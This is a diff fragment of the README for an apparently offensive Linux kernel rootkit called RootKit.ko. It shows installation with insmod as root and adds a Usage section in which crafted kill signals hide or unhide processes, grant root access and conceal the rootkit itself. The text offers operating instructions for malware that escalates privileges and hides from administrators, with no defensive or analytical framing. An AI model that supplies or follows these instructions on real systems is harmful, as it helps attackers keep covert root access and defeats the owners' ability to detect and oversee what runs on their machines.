@@ -24,6 +24,23 @@ Insert the module into the kernel as root
 sudo insmod RootKit.ko
 ```
 
+Usage
+--
+(Un)Hide a process (example:PID 500)
+```
+kill -0 500
+```
+
+Gain Root access (you can insert any PID,doesnt have to be 0)
+```
+kill -1 0
+```
+
+(Un)Hide the Rootkit (you can insert any PID,doesnt have to be 0)
+```
+kill -2 0
+```
+
 Uninstall
 --
 
